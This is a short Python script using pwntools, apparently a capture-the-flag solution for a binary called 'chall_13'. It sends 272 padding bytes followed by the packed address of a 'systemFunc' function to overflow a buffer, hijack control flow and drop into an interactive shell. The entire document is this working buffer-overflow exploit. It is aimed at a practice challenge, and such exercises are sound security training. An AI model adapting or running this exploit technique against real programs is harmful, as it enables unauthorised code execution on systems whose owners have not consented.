from pwn import *
elf=ELF("./chall_13")
system_addr=p32(elf.sym.systemFunc)
execution = b'a'*272+system_addr
r=process("./chall_13")
r.sendline(execution)
r.interactive()
r.close
